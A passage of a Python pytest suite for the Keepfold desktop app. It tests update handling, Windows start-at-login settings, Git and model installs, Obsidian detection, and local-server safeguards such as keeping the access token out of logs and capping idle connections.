    call(app, "POST", "/api/update/apply", {})
    j = wait_job(app)
    r = j["result"]
    assert j["error"] is None and r["launched"] is False
    assert r["download_url"] == "https://github.com/o/r/releases/tag/v9.0.0"
    assert "Download the new version" in r["note"]
    assert not app.stop.is_set() and github == []


@pytest.mark.parametrize("plat,want", [
    ("darwin", "Open Keepfold from Applications or Launchpad to reopen it."),
    ("linux", "Open Keepfold from the app menu to reopen it.")])
def test_reopen_app_mode_per_os(monkeypatch, plat, want):
    monkeypatch.setattr(update, "mode", lambda: "app")
    monkeypatch.setattr(sys, "platform", plat)
    assert server.reopen() == want


@pytest.mark.parametrize("plat,opener", [("darwin", ["open"]), ("linux", ["xdg-open"])])
def test_open_path_uses_os_opener(monkeypatch, tmp_path, plat, opener):
    """Folders open in Finder or the file manager, not the browser."""
    import webbrowser
    ran = []
    monkeypatch.setattr(webbrowser, "open", lambda *a, **k: pytest.fail("opened the browser"))
    monkeypatch.setattr(server, "_open", webbrowser.open)  # the default, not the fakes' recorder
    monkeypatch.setattr(targets, "_run", lambda args, timeout=300: ran.append((args, timeout))
                        or (True, ""))
    monkeypatch.setattr(sys, "platform", plat)
    server._open_path(tmp_path)
    assert ran == [([*opener, str(tmp_path)], 10)]


# ---- v7 review A: install, app manager, first run --------------------------------------------


def test_quiet_update_prepares_once_notifies_once_and_waits_for_the_click(
        app, github, monkeypatch):
    """The background check downloads a newer installer once, shows Restart to update (home
    and Status) and notifies once per version, never applying it; the click reuses the file."""
    from types import SimpleNamespace

    from keepfold import update
    from keepfold.app import desktop
    got = []

    def download(info, dest, on_progress, cancel):
        got.append(dest)
        dest.mkdir(parents=True, exist_ok=True)
        (dest / update.EXE).write_bytes(b"MZ")
        return dest / update.EXE
    monkeypatch.setattr(update, "mode", lambda: "installer")
    monkeypatch.setattr(update, "install_dir", lambda: None)
    monkeypatch.setattr(update, "download", download)
    notes = []
    app.desktop = SimpleNamespace(notify=notes.append, win=None)
    app.update_quietly()
    app.update_quietly()  # every 6 hours: the same version is not fetched or told again
    assert got == [update.dest_dir(_release())] and github == [] and not app.stop.is_set()
    assert notes == ["Keepfold 9.0.0 is ready: restart to update"]
    assert call(app, "GET", "/api/home/version")[1]["update"] == {"version": "9.0.0",
                                                                   "mode": "installer"}
    assert call(app, "GET", "/api/update")[1]["ready"]["version"] == "9.0.0"
    app.update_ready = None  # a restart: the same version is not notified again
    app.update_quietly()
    assert len(notes) == 1
    app.update_ready = None
    desktop.save_notify({"updates": False})
    desktop.save_state("update_notified", None)
    app.update_quietly()
    assert len(notes) == 1  # the setting is off
    monkeypatch.setattr(update, "download", lambda *a: pytest.fail("downloaded it again"))
    call(app, "POST", "/api/update/apply", {})  # Restart to update
    assert wait_job(app)["result"]["launched"] is True
    assert github == [(got[0] / update.EXE, os.getpid(), None)]
    assert app.stop.wait(5)


def test_quiet_update_in_a_dev_install_notes_the_command(app, github, monkeypatch):
    from keepfold import update
    monkeypatch.setattr(update, "download", lambda *a: pytest.fail("a dev install downloaded"))
    app.update_quietly()
    assert app.update_ready["command"] == update.command("v9.0.0") and github == []
    monkeypatch.setattr(update, "latest", lambda: _release((0, 1, 0)))
    app.update_ready = None
    app.update_quietly()  # not newer: nothing
    assert app.update_ready is None


def test_quiet_update_skipped_while_the_setting_is_off(app, github, monkeypatch):
    """app.update_check false: no GitHub request and no download, read again each pass; the
    Check for updates button still asks. Missing or true: the pass runs."""
    from keepfold import update
    asked = []
    real = update.latest
    monkeypatch.setattr(update, "latest", lambda: asked.append(1) or real())
    monkeypatch.setattr(update, "download", lambda *a: pytest.fail("downloaded while off"))
    for bad in ({"enabled": "no"}, {}, {"enabled": False, "extra": 1}):
        assert call(app, "POST", "/api/app/update-check", bad)[0] == 400
    assert call(app, "GET", "/api/update")[1]["auto"] is True  # missing: on
    assert call(app, "POST", "/api/app/update-check", {"enabled": False})[1] == {"enabled": False}
    assert call(app, "GET", "/api/status")[1]["update"]["auto"] is False
    app.update_quietly()
    assert asked == [] and app.update_ready is None
    call(app, "POST", "/api/update/check", {})  # the button works either way
    assert wait_job(app)["result"]["newer"] is True and asked == [1]
    call(app, "POST", "/api/app/update-check", {"enabled": True})
    app.update_quietly()
    assert len(asked) == 2 and app.update_ready["version"] == "9.0.0"


def test_update_check_sweeps_old_installers(app, github):
    tmp = Path.home() / ".keepfold" / "tmp"
    for name in ("update-0.0.9", "update-9.0.0"):
        (tmp / name).mkdir(parents=True)
        (tmp / name / "KeepfoldSetup.exe").write_bytes(b"MZ")
    call(app, "POST", "/api/update/check", {})
    assert wait_job(app)["result"]["newer"] is True
    assert sorted(p.name for p in tmp.iterdir()) == ["update-9.0.0"]  # the one it may launch
    server.make_server(None)[0].server_close()  # a launch sweeps the rest
    assert list(tmp.iterdir()) == []


def test_a_launch_keeps_a_prepared_newer_installer(app, monkeypatch):
    """A restart before Restart to update does not fetch the same installer again."""
    monkeypatch.setattr(update, "current", lambda: "0.2.0")
    tmp = Path.home() / ".keepfold" / "tmp"
    for name in ("update-0.1.0", "update-0.3.0"):
        (tmp / name).mkdir(parents=True)
        (tmp / name / "KeepfoldSetup.exe").write_bytes(b"MZ")
        (tmp / name / "KeepfoldSetup.exe.sha256").write_text(hashlib.sha256(b"MZ").hexdigest())
    server.make_server(None)[0].server_close()
    assert [p.name for p in tmp.iterdir()] == ["update-0.3.0"]


def test_quit_cancels_the_running_job(app):
    """A13: Quit says running jobs are cancelled; a download's process is ended too."""
    ended = threading.Event()

    class Proc:
        def terminate(self):
            ended.set()

    def run(job):
        job.proc = Proc()
        job.cancelled.wait(5)
        return {"ok": False, "cancelled": job.cancelled.is_set()}
    app.jobs.start("Downloading", "setup", run, cancellable=True)
    assert call(app, "POST", "/api/quit", {})[0] == 200
    assert ended.is_set() and app.stop.is_set()
    assert wait_job(app)["result"]["cancelled"] is True


def test_open_without_obsidian_uses_the_default_app(app, vault, fakes, monkeypatch):
    """A14: no obsidian:// handler, so the folder opens with this computer's own app; and a
    plain Open folder."""
    monkeypatch.setattr(server, "_obsidian", lambda: False)
    code, js, _, _ = call(app, "POST", "/api/open", {"what": "vault"})
    assert code == 200 and js == {"ok": True, "obsidian": False}
    assert fakes[-1] == ["open", vault.resolve().as_uri()]
    code, js, _, _ = call(app, "POST", "/api/open", {"what": "folder"})
    assert code == 200 and fakes[-1] == ["open", vault.resolve().as_uri()]
    monkeypatch.setattr(server, "_obsidian", lambda: True)
    assert call(app, "POST", "/api/open", {"what": "vault"})[1]["obsidian"] is True
    assert fakes[-1][1].startswith("obsidian://open?path=")


def test_obsidian_is_found_on_macos_only_as_an_installed_app(monkeypatch, tmp_path):
    present: set[str] = set()
    monkeypatch.setattr(sys, "platform", "darwin")
    monkeypatch.setattr(Path, "home", classmethod(lambda cls: tmp_path))
    monkeypatch.setattr(Path, "exists", lambda p: p.as_posix() in present)
    assert REAL_OBSIDIAN() is False
    present.add((tmp_path / "Applications" / "Obsidian.app").as_posix())
    assert REAL_OBSIDIAN() is True
    present.clear()
    present.add("/Applications/Obsidian.app")
    assert REAL_OBSIDIAN() is True


@pytest.mark.parametrize(("ran", "found"), [((True, "md.obsidian.desktop"), True),
                                            ((True, ""), False), ((False, "no xdg-mime"), False)])
def test_obsidian_is_found_on_linux_by_its_xdg_handler(monkeypatch, ran, found):
    monkeypatch.setattr(sys, "platform", "linux")
    calls = []
    monkeypatch.setattr(targets, "_run", lambda args, timeout=300: calls.append(
        (args, timeout)) or ran)
    assert REAL_OBSIDIAN() is found
    assert calls == [(["xdg-mime", "query", "default", "x-scheme-handler/obsidian"], 5)]


def test_search_model_counts_only_a_finished_download(home):
    """A5: a cancelled download (Hugging Face's .incomplete) is not "downloaded"."""
    from keepfold import doctor, semantic
    d = semantic.models_dir() / "models--BAAI--bge" / "blobs"
    d.mkdir(parents=True)
    (d / "abc.incomplete").write_bytes(b"half")
    assert status.embedding()["downloaded"] is False
    assert doctor.check_search_model()[0] == "WARN"
    (semantic.models_dir() / doctor.MODEL_READY).write_text("downloaded\n")
    assert status.embedding()["downloaded"] is True
    assert doctor.check_search_model()[0] == "PASS"


def test_start_at_login_on_windows_is_a_run_value(monkeypatch, fakes, tmp_path,
                                                  _no_real_run_key):
    """A10: Start at login is an HKCU Run value running the no-console receiver (faked
    registry); the old scheduled task goes on Add, on Remove and at app start."""
    monkeypatch.setattr(sys, "platform", "win32")
    monkeypatch.setattr(status, "test_copy", lambda: False)  # as the installed Keepfold
    exe = tmp_path / "bin" / "keepfold.exe"
    exe.parent.mkdir()
    (exe.parent / "keepfold-receiver.exe").write_bytes(b"MZ")
    monkeypatch.setattr("keepfold.clients.keepfold_command", lambda: str(exe))
    root = Path("C:/Users/me/Vault")
    want = f'"{exe.with_name("keepfold-receiver.exe")}" --vault "{root}"'
    assert status.login_command(root) == want
    assert status.login_task() == {"supported": True, "exists": False}
    assert want in status.login_shown(root) and "HKCU" in status.login_shown(root)
    job = type("Job", (), {"say": lambda self, s: None})()
    actions.login(job, root, True)
    assert _no_real_run_key == {status.LOGIN_TASK: want} and status.login_task()["exists"] is True
    assert fakes == [["schtasks", "/Delete", "/F", "/TN", status.LOGIN_TASK]]
    actions.login(job, root, False)
    assert _no_real_run_key == {} and status.login_task()["exists"] is False
    # migration: an old task (schtasks /Delete succeeds) becomes the Run value
    monkeypatch.setattr(targets, "_run", lambda a, timeout=300: (fakes.append(a), (True, ""))[1])
    actions.migrate_login(root)
    assert _no_real_run_key == {status.LOGIN_TASK: want}
    fakes.clear()
    actions.migrate_login(root)  # a Run value already there: nothing runs
    assert fakes == []


REAL_RUN = (status.run_set, status.run_delete)  # before conftest fakes them for each test


@pytest.mark.skipif(sys.platform != "win32", reason="the HKCU Run key and Task Scheduler")
def test_a_test_copy_never_changes_windows_start_up_settings(monkeypatch):
    """R1 (25 Nov): a Keepfold whose home folder was moved (tests, screenshots, demos) leaves the
    real install's Run values and Task Scheduler entry alone; the real install still may."""
    import winreg

    from keepfold.app import desktop
    writes = []
    for name in ("CreateKey", "SetValueEx", "DeleteValue"):
        monkeypatch.setattr(winreg, name, lambda *a, n=name: writes.append(n))
    monkeypatch.setattr(status, "run_set", REAL_RUN[0])
    monkeypatch.setattr(status, "run_delete", REAL_RUN[1])
    monkeypatch.setattr(targets, "_run", lambda a, timeout=300: (writes.append(a), (True, ""))[1])
    assert status.test_copy() is True  # conftest moved USERPROFILE to a temp folder
    with pytest.raises(OSError, match="test home folder"):
        status.run_set("x")
    with pytest.raises(OSError, match="test home folder"):
        status.run_delete(desktop.AUTOSTART)
    assert actions.drop_old_task() is False
    lines = []
    desktop.first_run(lines.append)
    assert writes == [] and "stays off" in lines[0]
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Volatile Environment") as k:
        real = Path(winreg.QueryValueEx(k, "USERPROFILE")[0])
    monkeypatch.setattr(Path, "home", classmethod(lambda cls: real))
    assert status.test_copy() is False  # the installed Keepfold, run with the real profile


def test_receiver_falls_back_to_the_console_keepfold(monkeypatch, tmp_path):
    exe = tmp_path / "keepfold.exe"
    monkeypatch.setattr("keepfold.clients.keepfold_command", lambda: str(exe))
    assert status.login_command(Path("C:/V")) == f'"{exe}" browse serve --vault "{Path("C:/V")}"'


def test_vault_refused_inside_the_install_folder(app, tmp_path):
    """A3: a vault inside the folder Keepfold is installed in (uninstall empties it) is refused,
    by the app's Setup and by `keepfold init`."""
    from test_cli import run
    inst = tmp_path / "Keepfold"
    inst.mkdir()
    (inst / "keepfold-install.txt").write_text("x")
    for target in (inst, inst / "notes"):
        call(app, "POST", "/api/setup/vault", {"path": str(target)})
        assert "installed in" in wait_job(app)["error"]
        r = run("init", str(target), ok=False)
        assert r.exit_code == 1 and "installed in" in r.output
    assert sorted(p.name for p in inst.iterdir()) == ["keepfold-install.txt"]


def test_setup_vault_step_warns_onedrive_and_asks_about_a_moved_vault(app, tmp_path,
                                                                     monkeypatch):
    """A15: the OneDrive warning is in the job lines; a vault folder that is gone is a
    question ("moved"), not a silently new vault."""
    monkeypatch.setenv("OneDrive", str(tmp_path / "OneDrive"))
    call(app, "POST", "/api/setup/vault", {"path": str(tmp_path / "OneDrive" / "Keepfold")})
    job = wait_job(app)
    assert job["error"] is None and any("inside OneDrive" in x for x in job["result"]["lines"])
    gone = server.App(tmp_path / "moved-away").setup()["vault"]
    assert gone["moved"] is True and gone["done"] is False
    assert server.App(app.root).setup()["vault"]["moved"] is False


class _Proc:
    def __init__(self, out: bytes, rc: int = 0):
        self.stdout, self.rc = io.BytesIO(out), rc

    def wait(self):
        return self.rc

    def terminate(self):
        pass


def test_git_is_offered_and_doctor_warns_without_it(app, vault, monkeypatch):
    """A16: without git, doctor WARNs (not FAIL) and Setup offers winget's Git. Deps A1/A2:
    winget never asks (stdin is closed), installs for this account only, and the vault's
    history starts right after the install, with no quit and reopen."""
    import shutil
    import sys

    from keepfold import cli, doctor, session
    monkeypatch.setattr(sys, "platform", "win32")
    # no git, and the real which() would ask Windows (_winapi) now, which Linux has not
    monkeypatch.setattr(shutil, "which", lambda c, *a, **k: None)
    monkeypatch.setattr(targets, "_which", lambda c: "winget" if c == "winget" else None)
    monkeypatch.setattr(session, "git_exe", lambda: None)
    monkeypatch.setattr(wizard, "free_space_ok", lambda p, n: (True, ""))
    g = server.App(vault).setup()["git"]
    assert g["found"] is False
    assert g["install"]["run"] == ["winget", "install", "--id", "Git.Git", "-e", "--scope", "user",
                                   "--source", "winget", "--disable-interactivity",
                                   "--accept-package-agreements", "--accept-source-agreements"]
    assert "Git.Git" in g["install"]["source"] and g["install"]["size"] == "about 70 MB"
    assert g["install"]["license"].startswith("https://")  # shown beside the button
    started, inits = [], []
    monkeypatch.setattr(actions, "_popen", lambda args, **k: (
        started.append((args, k)), _Proc(b"Successfully installed\n"))[1])
    # git is found where the installer put it (the app's PATH predates the install)
    monkeypatch.setattr(session, "git_exe", lambda: "C:\\Users\\me\\Programs\\Git\\cmd\\git.exe")
    monkeypatch.setattr(cli, "_init", lambda root, default=False: (
        inits.append((root, default)), (["git init"], [], []))[1])
    call(app, "POST", "/api/setup/git", {})
    job = wait_job(app)
    assert job["section"] == "setup" and job["result"]["ok"]
    assert job["result"]["lines"][-2:] == ["git init",
                                          "Git is installed and your vault's history has started."]
    assert [(r.resolve(), d) for r, d in inits] == [(vault.resolve(), False)]
    assert "Quit Keepfold" not in json.dumps(job)
    assert started[0][0] == g["install"]["run"] and "creationflags" in started[0][1]
    nogit = vault.parent / "nogit"
    nogit.mkdir()
    monkeypatch.setattr(session, "git_exe", lambda: None)
    st, _, detail, fix = doctor.check_git(nogit)
    assert st == "WARN" and "not installed" in detail and "Git.Git" in fix
    assert "Status → Git → Install Git" in fix and "restart Keepfold" not in fix


def test_git_user_scope_failure_offers_the_admin_install(app, vault, monkeypatch):
    """Deps A1: a failed user-scope install says so and offers a second install whose button
    says Windows will ask for admin permission; nothing elevates by itself. The Status row's
    install shows its result on Status."""
    import sys

    from keepfold import cli, session
    monkeypatch.setattr(sys, "platform", "win32")
    monkeypatch.setattr(targets, "_which", lambda c: "winget" if c == "winget" else None)
    monkeypatch.setattr(session, "git_exe", lambda: None)
    monkeypatch.setattr(wizard, "free_space_ok", lambda p, n: (True, ""))
    monkeypatch.setattr(cli, "_init", lambda *a, **k: pytest.fail("no git, no init"))
    started = []
    monkeypatch.setattr(actions, "_popen", lambda args, **k: (
        started.append(args), _Proc(b"No applicable installer found\n", rc=1))[1])
    call(app, "POST", "/api/setup/git", {"from": "status"})
    job = wait_job(app)
    r = job["result"]
    assert job["section"] == "status" and r["ok"] is False and len(started) == 1
    assert "for your Windows account only" in r["admin"] and r["license"].startswith("https://")
    assert "admin permission" in r["admin"]
    call(app, "POST", "/api/setup/git", {"scope": "machine"})
    job = wait_job(app)
    assert started[1][started[1].index("--scope") + 1] == "machine"
    assert "admin" not in job["result"]  # only the user-scope failure offers it
    with pytest.raises(ValueError, match="scope"):
        wizard.git_plan("everyone")


def test_downloads_check_free_space_first(app, vault, monkeypatch):
    """Deps A6: Install Ollama, Install Git and a model download check the free space first;
    too little starts nothing and says how much, until the owner continues anyway."""
    import sys

    from keepfold import session
    monkeypatch.setattr(sys, "platform", "win32")
    monkeypatch.setattr(targets, "_which", lambda c: f"C:/bin/{c}.exe")
    monkeypatch.setattr(session, "git_exe", lambda: None)
    monkeypatch.setattr(status, "ollama_models", lambda: [])
    asked = []
    monkeypatch.setattr(wizard, "free_space_ok", lambda p, n: (
        asked.append(n), (False, "Needs about 2.0 GB; 1.1 GB free on C:."))[1])
    for path, body, need in (("/api/setup/install", {}, wizard.OLLAMA_BYTES),
                             ("/api/setup/git", {}, wizard.GIT_BYTES),
                             ("/api/setup/model", {"model": "2b", "runner": "ollama"}, 2 * 10**9),
                             ("/api/llm/pull", {"name": "qwen3.5:2b"}, 2 * 10**9)):
        code, js, _, _ = call(app, "POST", path, body)
        assert code == 200 and js == {"disk": "Needs about 2.0 GB; 1.1 GB free on C:."}, path
        assert asked[-1] == need and app.jobs.cur is None, path
    monkeypatch.setattr(actions, "_popen", lambda args, **k: _Proc(b"done\n"))
    code, js, _, _ = call(app, "POST", "/api/setup/install", {"override": True})
    assert code == 200 and js["job"] == "Installing Ollama" and wait_job(app)["result"]["ok"]
    # a model the runner already holds needs no space
    monkeypatch.setattr(status, "ollama_models", lambda: ["qwen3.5:2b"])
    n = len(asked)
    monkeypatch.setattr(actions, "_popen", lambda args, **k: _Proc(b"up to date\n"))
    assert "job" in call(app, "POST", "/api/llm/pull", {"name": "qwen3.5:2b"})[1]
    wait_job(app)
    assert len(asked) == n


def test_free_name_model_size_comes_from_the_registry_on_click(app, monkeypatch):
    """Deps A7: a Setup model's size is known; another name's is its manifest's total on
    ollama.com, asked once (on the click), never a download."""
    import urllib.error

    seen = []

    class Resp(io.BytesIO):
        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

    def urlopen(req, timeout=None):
        seen.append((req.full_url, req.get_header("Accept")))
        if "nosuch" in req.full_url:
            raise urllib.error.HTTPError(req.full_url, 404, "not found", {}, None)
        if "offline" in req.full_url:
            raise urllib.error.URLError("no network")
        return Resp(json.dumps({"config": {"size": 500}, "layers": [
            {"size": 3_400_000_000}, {"size": 1_000}]}).encode())
    monkeypatch.setattr(wizard.urllib.request, "urlopen", urlopen)
    monkeypatch.setattr(wizard, "_SIZES", {})
    assert call(app, "POST", "/api/llm/size", {"name": "qwen3.5:4b"})[1] == {
        "name": "qwen3.5:4b", "bytes": 3 * 10**9, "size": "about 3.0 GB", "source": "ollama.com"}
    assert seen == []  # a Setup model: no request
    js = call(app, "POST", "/api/llm/size", {"name": "llama3.2"})[1]
    assert js["bytes"] == 3_400_001_500 and js["size"] == "about 3.4 GB"
    assert seen == [("https://registry.ollama.ai/v2/library/llama3.2/manifests/latest",
                     "application/vnd.docker.distribution.manifest.v2+json")]
    assert wizard.ollama_size("llama3.2") == 3_400_001_500 and len(seen) == 1  # remembered
    wizard.ollama_size("someone/model:7b")
    assert seen[-1][0].endswith("/v2/someone/model/manifests/7b")
    code, js, _, _ = call(app, "POST", "/api/llm/size", {"name": "nosuch:1b"})
    assert code == 400 and "no model named nosuch:1b" in js["error"]
    code, js, _, _ = call(app, "POST", "/api/llm/size", {"name": "offline:1b"})
    assert code == 400 and "could not get the size" in js["error"]
    code, js, _, _ = call(app, "POST", "/api/llm/size", {"name": "--help"})
    assert code == 400 and len(seen) == 4  # a bad name asks nobody


def test_status_git_row_installs_and_llm_row_judges_the_chosen_runner(vault, monkeypatch):
    """Deps A13: Status has a Git row with Setup's Install Git (and its License link).
    Deps A12: the Local model row names the configured runner and is ok only when that runner
    holds the chosen model."""
    import sys

    from keepfold import session
    monkeypatch.setattr(sys, "platform", "win32")
    monkeypatch.setattr(targets, "_which", lambda c: "winget" if c == "winget" else None)
    monkeypatch.setattr(session, "git_exe", lambda: None)
    row = status.git_row()
    assert row["state"] == "off" and row["value"] == "not installed"
    assert "Git.Git" in row["install"]["label"] and "about 70 MB" in row["install"]["label"]
    assert row["install"]["license"] == wizard.GIT_LICENSE and row["page"] is None
    monkeypatch.setattr(targets, "_which", lambda c: None)  # no winget: the page instead
    assert status.git_row()["install"] is None and status.git_row()["page"] == wizard.GIT_PAGE
    monkeypatch.setattr(session, "git_exe", lambda: "C:/git/cmd/git.exe")
    assert status.git_row()["state"] == "ok" and "install" not in status.git_row()

    def llm(runner, ollama, loaded=(), lms=None, model="qwen3.5:2b"):
        monkeypatch.setattr(status, "llm", lambda quick=False: {
            "enabled": True, "runner": runner, "model": model, "loaded": list(loaded),
            "ollama": ollama, "lms": lms, "server_port": None})
        r = status.llm_row()
        return r["state"], r["value"]
    monkeypatch.setattr(status, "lms_models", lambda: [])
    # LM Studio chosen: Ollama answering with other models does not make it ok
    assert llm("lmstudio", ["llama3:8b"], lms="C:/lms.exe") == ("warn", "LM Studio, qwen3.5:2b")
    assert llm("lmstudio", None, loaded=["qwen3.5:2b"], lms="C:/lms.exe") == (
        "ok", "LM Studio, qwen3.5:2b")
    monkeypatch.setattr(status, "lms_models", lambda: [{"key": "qwen3.5:2b", "name": "Q"}])
    assert llm("lmstudio", None, lms="C:/lms.exe")[0] == "ok"  # it loads when needed
    # Ollama chosen: ok only when Ollama holds the model, even with LM Studio installed
    assert llm("ollama", ["llama3:8b"], lms="C:/lms.exe") == ("warn", "Ollama, qwen3.5:2b")
    assert llm("ollama", ["qwen3.5:2b"], lms="C:/lms.exe") == ("ok", "Ollama, qwen3.5:2b")
    assert llm("ollama", None) == ("warn", "Ollama, qwen3.5:2b")
    assert llm("auto", None) == ("warn", "none running, qwen3.5:2b")
    assert llm("auto", ["QWEN3.5:2B"]) == ("ok", "Ollama, qwen3.5:2b")


@pytest.mark.parametrize(("enabled", "runner", "ollama", "lms", "model", "value", "detail"), [
    (False, "auto", ["llama3:8b"], None, None, "Ollama, no model chosen", "Off. Optional"),
    (False, "auto", None, None, None, "none running, no model chosen", "Off. Optional"),
    (True, "auto", ["llama3:8b"], None, None, "Ollama, no model chosen",
     "On, but no model is chosen. Open Local model to choose one."),
    (True, "ollama", None, None, None, "Ollama, no model chosen", "On, but no model is chosen."),
    (True, "auto", None, None, "q:2b", "none running, q:2b",
     "On, but neither Ollama nor LM Studio is running."),
    (True, "ollama", None, None, "q:2b", "Ollama, q:2b", "On, but Ollama is not running."),
    (True, "lmstudio", None, None, "q:2b", "LM Studio, q:2b",
     "On, but LM Studio is not on this computer."),
    (True, "ollama", ["llama3:8b"], None, "q:2b", "Ollama, q:2b",
     "On, but Ollama does not have q:2b. Open Local model to get it"),
    (True, "lmstudio", None, "C:/lms.exe", "q:2b", "LM Studio, q:2b",
     "On, but LM Studio does not have q:2b."),
    (True, "ollama", ["q:2b"], None, "q:2b", "Ollama, q:2b", "On: sorts your browsing"),
])
def test_status_llm_row_says_what_is_true(monkeypatch, enabled, runner, ollama, lms, model,
                                          value, detail):
    """The Local model row names the runner that is set or running and says in plain words
    what is missing: a model, a running runner, LM Studio itself, or the model in it."""
    monkeypatch.setattr(status, "lms_models", lambda: [])
    monkeypatch.setattr(status, "llm", lambda quick=False: {
        "enabled": enabled, "runner": runner, "model": model, "loaded": [],
        "ollama": ollama, "lms": lms, "server_port": None})
    r = status.llm_row()
    assert r["value"] == value and r["detail"].startswith(detail), r
    assert "no runner" not in r["detail"]


def test_installer_wording(app, monkeypatch):
    """A12: an installer install is told to use the Start menu, never `keepfold app` or uv."""
    import shutil

    from keepfold import doctor, update
    _, _, raw, _ = call(app, "GET", f"/manage?t={app.token}", token=False)
    assert b"Run keepfold app again to reopen it." in raw and b"{{REOPEN}}" not in raw
    monkeypatch.setattr(update, "mode", lambda: "installer")
    _, _, raw, _ = call(app, "GET", f"/manage?t={app.token}", token=False)
    assert raw.count(b"Open Keepfold from the Start menu to reopen it.") == 2
    assert b"Start menu" in call(app, "GET", "/manage?t=wrong", token=False)[2]
    for check in (doctor.check_search_model, doctor.check_ai_apps):
        assert "Start menu" in check()[3] and "keepfold app" not in check()[3]
    monkeypatch.setattr(shutil, "which", lambda c, *a, **k: None)
    assert "uv tool" not in doctor.check_on_path()[3]


def test_skill_path(app):
    """A2: the Chat skill links to the latest release when no local zip exists."""
    js = call(app, "GET", "/api/connect")[1]
    assert js["skill_url"].startswith("https://github.com/")
    assert js["skill_url"].endswith("/releases/latest/download/keepfold-skill.zip")


def test_a_second_launch_opens_the_running_app(vault, monkeypatch):
    """A11: ~/.keepfold/app.json names the running app; a stale file is ignored. The browser app
    has no window to show, so a second launch opens its page in the browser."""
    from keepfold.app import desktop, launch
    daytime(monkeypatch)
    lines: list[str] = []
    t = threading.Thread(target=server.run, args=(vault,),
                         kwargs={"open_browser": False, "echo": lines.append}, daemon=True)
    t.start()
    for _ in range(100):
        if lines:
            break
        time.sleep(0.05)
    url = lines[0].split(": ", 1)[1]
    assert server.running_url() == url
    opened = []
    monkeypatch.setattr(launch.webbrowser, "open", opened.append)
    monkeypatch.setattr(desktop, "run", lambda *a, **k: pytest.fail("started a second app"))
    assert server.show_window(url) is False
    launch.main()
    assert opened == [url]
    port, token = int(url.split(":")[2].split("/")[0]), url.split("?t=")[1]
    c = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
    c.request("POST", "/api/quit", body=b"{}", headers={
        "Host": f"127.0.0.1:{port}", "X-Keepfold-Token": token,
        "Content-Type": "application/json"})
    assert c.getresponse().status == 200
    t.join(15)
    assert not server.state_file().exists() and server.running_url() is None
    server.state_file().write_text(json.dumps({"port": port, "token": token, "pid": 1}))
    assert server.running_url() is None  # stale: nothing answers there
    server.state_file().write_text("not json")
    assert server.running_url() is None


def test_the_launcher_log_never_holds_the_key(monkeypatch, capsys):
    from keepfold.app import desktop, launch
    seen = {}
    monkeypatch.setattr(server, "running_url", lambda: None)
    monkeypatch.setattr(desktop, "run", lambda root, hidden, echo, smoke: (
        echo("Keepfold app: http://127.0.0.1:8790/?t=Abc-_123"), seen.setdefault("ok", 1)))
    launch.main()
    out = capsys.readouterr().out
    assert seen and "http://127.0.0.1:8790/" in out and "Abc" not in out and "?t=" not in out


def test_the_browser_app_prints_no_key_when_it_opens_the_page(monkeypatch):
    """D1 §4.3: the browser opens the link with its key; the printed line drops it."""
    import types
    url = "http://127.0.0.1:8790/?t=Abc-_123"
    def interrupted(**_):
        raise KeyboardInterrupt
    srv = types.SimpleNamespace(serve_forever=interrupted)
    monkeypatch.setattr(server, "start", lambda *a, **k: (srv, None, url))
    monkeypatch.setattr(server, "finish", lambda *a: None)
    opened, lines = [], []
    monkeypatch.setattr(server, "_open", opened.append)
    server.run(None, echo=lines.append)
    assert opened == [url] and "Abc" not in "".join(lines) and "http://127.0.0.1:8790/" in lines[0]


def test_launcher_failure_shows_a_message_with_the_log(monkeypatch):
    import sys

    from keepfold.app import desktop, launch
    monkeypatch.setattr(sys, "stdout", None)
    monkeypatch.setattr(sys, "stderr", None)
    said = []
    monkeypatch.setattr(launch, "_alert", said.append)

    def broken(*a, **k):
        raise ImportError("half-done upgrade")
    monkeypatch.setattr(desktop, "run", broken)
    with pytest.raises(SystemExit):
        launch.main()
    log = Path.home() / ".keepfold" / "logs" / "app.log"
    sys.stdout.close()
    assert said and str(log) in said[0] and "half-done upgrade" in log.read_text()


def test_receiver_entry_runs_browse_serve(monkeypatch, vault):
    import sys

    from keepfold import browse_serve
    from keepfold.app import launch
    got = {}
    monkeypatch.setattr(sys, "argv", ["keepfold-receiver.exe", "--vault", str(vault)])
    monkeypatch.setattr(browse_serve, "serve", lambda v: got.update(root=v.root))
    with pytest.raises(SystemExit) as e:
        launch.receiver()
    assert e.value.code == 0 and got == {"root": vault.resolve()}
    got.clear()  # a command line with the --port older versions took still runs
    monkeypatch.setattr(sys, "argv", ["keepfold-receiver.exe", "--vault", str(vault),
                                      "--port", "8799"])
    with pytest.raises(SystemExit) as e:
        launch.receiver()
    assert e.value.code == 0 and got == {"root": vault.resolve()}


def test_disconnect_removes_keepfold_from_every_app(home):
    from test_cli import run
    p = home / ".cursor" / "mcp.json"
    p.parent.mkdir()
    p.write_text(json.dumps({"mcpServers": {"keepfold": ENTRY, "other": {"command": "x"}}}))
    out = run("disconnect").output
    assert "remove" in out and "Cursor" in out
    assert json.loads(p.read_text()) == {"mcpServers": {"other": {"command": "x"}}}
    assert "No AI app had Keepfold." in run("disconnect").output


def test_a_busy_port_is_refused_not_shared(vault):
    """Windows lets a second server bind a used port; the app would then print its token for a
    server that is not Keepfold. An explicit --port that is taken fails with a plain message."""
    other = socket.socket()  # as http.server and most dev servers do
    other.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    other.bind(("127.0.0.1", 0))
    other.listen()
    try:
        busy = other.getsockname()[1]
        with pytest.raises(OSError):
            server.make_server(vault, busy)
        with pytest.raises(SystemExit, match=f"Port {busy} is in use"):
            server.run(vault, open_browser=False, port=busy, echo=lambda *a: None)
    finally:
        other.close()


def test_connections_over_the_cap_are_closed_at_once(home, monkeypatch):
    """A local program cannot exhaust threads with idle connections."""
    monkeypatch.setattr(server, "MAX_CONNECTIONS", 4)
    s = server.make_server(None)[0]
    threading.Thread(target=lambda: s.serve_forever(0.05), daemon=True).start()
    port = s.server_address[1]
    try:
        idle = [socket.create_connection(("127.0.0.1", port), timeout=5) for _ in range(4)]
        extra = [socket.create_connection(("127.0.0.1", port), timeout=5) for _ in range(3)]
        for x in extra:  # closed by the server without a byte sent
            try:
                assert x.recv(1) == b""
            except (ConnectionResetError, ConnectionAbortedError):
                pass
        idle[0].settimeout(0.3)
        with pytest.raises(TimeoutError):  # a connection under the cap stays open
            idle[0].recv(1)
        for x in idle + extra:
            x.close()
        code = None
        for _ in range(50):  # the handlers see EOF and give their slots back
